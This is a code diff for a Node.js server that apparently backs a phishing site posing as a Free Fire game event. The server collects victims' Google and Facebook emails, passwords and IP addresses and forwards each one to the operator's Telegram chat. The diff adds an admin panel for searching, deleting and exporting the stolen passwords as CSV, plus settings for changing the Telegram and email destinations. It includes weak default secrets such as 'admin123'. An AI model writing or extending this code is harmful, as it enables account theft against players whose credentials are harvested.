@@ -3,6 +3,7 @@ const nodemailer = require('nodemailer');
 const path       = require('path');
 const fs         = require('fs');
 const https      = require('https');
+const crypto     = require('crypto');
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
@@ -13,12 +14,45 @@ app.use(express.static(path.join(__dirname)));
 // ════════════════════════════════════════
 //  CONFIG
 // ════════════════════════════════════════
-const TG_TOKEN  = process.env.TELEGRAM_BOT_TOKEN;
-const TG_CHAT   = process.env.TELEGRAM_CHAT_ID;
-const IS_VERCEL = !!process.env.VERCEL;
-const DATA_FILE = IS_VERCEL
-  ? '/tmp/logins.json'
-  : path.join(__dirname, 'data', 'logins.json');
+const IS_VERCEL   = !!process.env.VERCEL;
+const DATA_FILE   = IS_VERCEL ? '/tmp/logins.json'    : path.join(__dirname, 'data', 'logins.json');
+const CFG_FILE    = IS_VERCEL ? '/tmp/settings.json'  : path.join(__dirname, 'data', 'settings.json');
+const ADMIN_SECRET = process.env.ADMIN_SECRET || 'iwxteam-ff-admin-2026';
+
+// ── Dynamic settings (override env vars dari admin panel) ──
+function loadSettings() {
+  try { if (fs.existsSync(CFG_FILE)) return JSON.parse(fs.readFileSync(CFG_FILE, 'utf8')); } catch(_) {}
+  return {};
+}
+function saveSettings(obj) {
+  try {
+    const dir = path.dirname(CFG_FILE);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(CFG_FILE, JSON.stringify(obj, null, 2));
+  } catch(e) { console.error('saveSettings error:', e.message); }
+}
+let cfg = loadSettings();
+
+function getCfg(key, envKey, def = '') {
+  return (cfg[key] !== undefined && cfg[key] !== '') ? cfg[key] : (process.env[envKey] || def);
+}
+const getTgToken  = () => getCfg('tgToken',  'TELEGRAM_BOT_TOKEN', '');
+const getTgChat   = () => getCfg('tgChat',   'TELEGRAM_CHAT_ID',   '');
+const getEmailUser= () => getCfg('emailUser','EMAIL_USER', '');
+const getEmailPass= () => getCfg('emailPass','EMAIL_PASS', '');
+const getAdminPass= () => getCfg('adminPass','ADMIN_PASSWORD', 'admin123');
+
+// ── Admin token (valid 24 jam) ──
+function generateAdminToken() {
+  const day = Math.floor(Date.now() / 86400000);
+  return crypto.createHmac('sha256', ADMIN_SECRET).update(`${getAdminPass()}:${day}`).digest('hex');
+}
+function verifyAdminToken(token) { return token && token === generateAdminToken(); }
+function adminMiddleware(req, res, next) {
+  const auth = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
+  if (!verifyAdminToken(auth)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
+  next();
+}
 
 // ════════════════════════════════════════
 //  DATA STORE
@@ -58,13 +92,14 @@ function clearData() {
 // ════════════════════════════════════════
 //  TELEGRAM API HELPERS
 // ════════════════════════════════════════
-function tgRequest(method, payload) {
+function tgRequest(method, payload, customToken) {
   return new Promise((resolve) => {
-    if (!TG_TOKEN) return resolve(null);
+    const token = customToken || getTgToken();
+    if (!token) return resolve(null);
     const body = JSON.stringify(payload);
     const req = https.request({
       hostname: 'api.telegram.org',
-      path: `/bot${TG_TOKEN}/${method}`,
+      path: `/bot${token}/${method}`,
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
     }, res => {
@@ -451,7 +486,7 @@ async function handleUpdate(update) {
     const from = msg.from.username || msg.from.first_name || 'Admin';
 
     // Cek hanya admin
-    if (TG_CHAT && chat !== TG_CHAT) {
+    if (getTgChat() && chat !== getTgChat()) {
       return tgSend(chat, '⛔ Akses ditolak. Bot ini private.');
     }
 
@@ -594,7 +629,7 @@ ${LINE}
 
     await tgAnswer(cb.id);
 
-    if (TG_CHAT && chat !== TG_CHAT) return;
+    if (getTgChat() && chat !== getTgChat()) return;
 
     // MENU UTAMA
     if (data === 'menu') {
@@ -683,7 +718,7 @@ Contoh:
 //  SETUP WEBHOOK TELEGRAM
 // ════════════════════════════════════════
 async function setupWebhook() {
-  if (!TG_TOKEN) return console.log('[Bot] TG_TOKEN tidak ada, webhook tidak diset.');
+  if (!getTgToken()) return console.log('[Bot] TG_TOKEN tidak ada, webhook tidak diset.');
 
   // Prioritas: WEBHOOK_URL (manual) > VERCEL_URL > REPLIT_DEV_DOMAIN
   let webhookUrl = process.env.WEBHOOK_URL || null;
@@ -746,9 +781,9 @@ app.post('/api/login', async (req, res) => {
   const no = logins.length;
 
   // Kirim notif Telegram
-  if (TG_TOKEN && TG_CHAT) {
+  if (getTgToken() && getTgChat()) {
     const notifText = buildNotif(entry, no);
-    await tgSend(TG_CHAT, notifText, {
+    await tgSend(getTgChat(), notifText, {
       reply_markup: {
         inline_keyboard: [
           [
@@ -808,7 +843,7 @@ app.get('/api/search', (req, res) => {
 
 // ── API: Webhook status ──
 app.get('/api/webhook-status', async (req, res) => {
-  if (!TG_TOKEN) return res.json({ ok: false, error: 'TG_TOKEN tidak ada' });
+  if (!getTgToken()) return res.json({ ok: false, error: 'TG_TOKEN tidak ada' });
   const info = await tgRequest('getWebhookInfo', {});
   const me   = await tgRequest('getMe', {});
   res.json({
@@ -824,7 +859,7 @@ app.get('/api/webhook-status', async (req, res) => {
 
 // ── API: Manual setup webhook ──
 app.get('/api/setup-webhook', async (req, res) => {
-  if (!TG_TOKEN) return res.json({ ok: false, error: 'TG_TOKEN tidak ada' });
+  if (!getTgToken()) return res.json({ ok: false, error: 'TG_TOKEN tidak ada' });
   await setupWebhook();
   const info = await tgRequest('getWebhookInfo', {});
   res.json({ ok: true, webhook_url: info && info.result && info.result.url });
@@ -835,6 +870,145 @@ app.get('/api/stats', (req, res) => {
   const total = logins.length;
   const google = logins.filter(l => l.method === 'Google').length;
   res.json({ total, google, facebook: total - google, latest: logins[0] || null });
+});
+
+// ════════════════════════════════════════
+//  ADMIN PANEL — /iwxteam/admin
+// ════════════════════════════════════════
+
+// Serve admin dashboard
+app.get('/iwxteam/admin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'admin.html'));
+});
+
+// Login
+app.post('/iwxteam/api/auth', (req, res) => {
+  const { password } = req.body;
+  if (!password || password !== getAdminPass()) {
+    return res.status(401).json({ ok: false, error: 'Password salah' });
+  }
+  res.json({ ok: true, token: generateAdminToken() });
+});
+
+// Verify token
+app.get('/iwxteam/api/verify', adminMiddleware, (req, res) => {
+  res.json({ ok: true });
+});
+
+// Stats admin
+app.get('/iwxteam/api/stats', adminMiddleware, (req, res) => {
+  const total = logins.length;
+  const now   = Date.now();
+  const today = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
+  const todayCount = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
+  const weekCount  = logins.filter(l => now - l.ts < 7  * 86400000).length;
+  const monthCount = logins.filter(l => now - l.ts < 30 * 86400000).length;
+  const google     = logins.filter(l => l.method === 'Google').length;
+  const latest     = logins.slice(0, 5);
+  res.json({ total, today: todayCount, week: weekCount, month: monthCount, google, facebook: total - google, latest });
+});
+
+// Data paginated + search
+app.get('/iwxteam/api/data', adminMiddleware, (req, res) => {
+  const page  = Math.max(0, parseInt(req.query.page)  || 0);
+  const limit = Math.min(100, parseInt(req.query.limit) || 20);
+  const q     = (req.query.q || '').toLowerCase().trim();
+  const method= (req.query.method || '').toLowerCase();
+  let filtered = logins;
+  if (q) filtered = filtered.filter(l =>
+    l.nickname.toLowerCase().includes(q) || l.uid.includes(q) ||
+    l.email.toLowerCase().includes(q)    || (l.ip||'').includes(q)
+  );
+  if (method === 'google')   filtered = filtered.filter(l => l.method === 'Google');
+  if (method === 'facebook') filtered = filtered.filter(l => l.method === 'Facebook');
+  const total = filtered.length;
+  const data  = filtered.slice(page * limit, (page + 1) * limit).map((l, i) => ({ ...l, no: page * limit + i + 1 }));
+  res.json({ total, page, limit, pages: Math.ceil(total / limit), data });
+});
+
+// Hapus per nomor atau range
+app.post('/iwxteam/api/delete', adminMiddleware, (req, res) => {
+  const { numbers, from: f, to: t } = req.body;
+  let indices = [];
+  if (f !== undefined && t !== undefined) {
+    const cap = Math.min(t, logins.length);
+    for (let i = f; i <= cap; i++) indices.push(i - 1);
+  } else if (Array.isArray(numbers)) {
+    indices = numbers.map(n => n - 1).filter(i => i >= 0 && i < logins.length);
+  }
+  if (!indices.length) return res.json({ ok: false, error: 'Tidak ada data valid' });
+  indices.sort((a, b) => b - a).forEach(i => logins.splice(i, 1));
+  saveData(logins);
+  res.json({ ok: true, deleted: indices.length, remaining: logins.length });
+});
+
+// Hapus semua
+app.post('/iwxteam/api/delete-all', adminMiddleware, (req, res) => {
+  const count = logins.length;
+  clearData();
+  res.json({ ok: true, deleted: count });
+});
+
+// Export CSV
+app.get('/iwxteam/api/export', adminMiddleware, (req, res) => {
+  const header = 'No,Nickname,UID,Level,Method,Email,Password,IP,Waktu\n';
+  const rows = logins.map((l, i) => {
+    const t = new Date(l.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    const esc = v => `"${String(v||'').replace(/"/g,'""')}"`;
+    return `${i+1},${esc(l.nickname)},${esc(l.uid)},${esc(l.level||'-')},${esc(l.method)},${esc(l.email)},${esc(l.password)},${esc(l.ip||'-')},${esc(t)}`;
+  }).join('\n');
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', `attachment; filename="ff-login-${Date.now()}.csv"`);
+  res.send('\uFEFF' + header + rows);
+});
+
+// Get settings (nilai disensor)
+app.get('/iwxteam/api/settings', adminMiddleware, (req, res) => {
+  const mask = v => v ? v.slice(0, 4) + '*'.repeat(Math.max(0, v.length - 4)) : '';
+  res.json({
+    ok: true,
+    tgToken:    mask(getTgToken()),
+    tgChat:     getTgChat(),
+    emailUser:  getEmailUser(),
+    emailPass:  mask(getEmailPass()),
+    webhookUrl: process.env.WEBHOOK_URL || `https://${process.env.VERCEL_URL || process.env.REPLIT_DEV_DOMAIN || ''}/webhook`,
+    adminPass:  '••••••••',
+    hasTgToken: !!getTgToken(),
+    hasTgChat:  !!getTgChat(),
+  });
+});
+
+// Update settings
+app.post('/iwxteam/api/settings', adminMiddleware, (req, res) => {
+  const { tgToken, tgChat, emailUser, emailPass, adminPass } = req.body;
+  if (tgToken   !== undefined && !tgToken.includes('*')   && tgToken   !== '') cfg.tgToken   = tgToken;
+  if (tgChat    !== undefined && tgChat !== '')  cfg.tgChat    = tgChat;
+  if (emailUser !== undefined && emailUser !== '') cfg.emailUser = emailUser;
+  if (emailPass !== undefined && !emailPass.includes('*') && emailPass !== '') cfg.emailPass = emailPass;
+  if (adminPass !== undefined && !adminPass.includes('•') && adminPass.length >= 6) cfg.adminPass = adminPass;
+  saveSettings(cfg);
+  res.json({ ok: true, newToken: generateAdminToken() });
+});
+
+// Test Telegram
+app.post('/iwxteam/api/test-telegram', adminMiddleware, async (req, res) => {
+  const token = req.body.token || getTgToken();
+  const chat  = req.body.chat  || getTgChat();
+  if (!token || !chat) return res.json({ ok: false, error: 'Token atau Chat ID belum diset' });
+  const result = await tgRequest('sendMessage', {
+    chat_id: chat,
+    text: '✅ <b>Test Koneksi Admin Panel</b>\n🎮 FF Event Admin Dashboard aktif!',
+    parse_mode: 'HTML'
+  }, token);
+  if (result && result.ok) res.json({ ok: true });
+  else res.json({ ok: false, error: (result && result.description) || 'Gagal kirim pesan' });
+});
+
+// Reset webhook setelah ganti token
+app.post('/iwxteam/api/reset-webhook', adminMiddleware, async (req, res) => {
+  await setupWebhook();
+  const info = await tgRequest('getWebhookInfo', {});
+  res.json({ ok: true, webhook_url: info && info.result && info.result.url });
 });
 
 // ── Fallback ke index.html ──
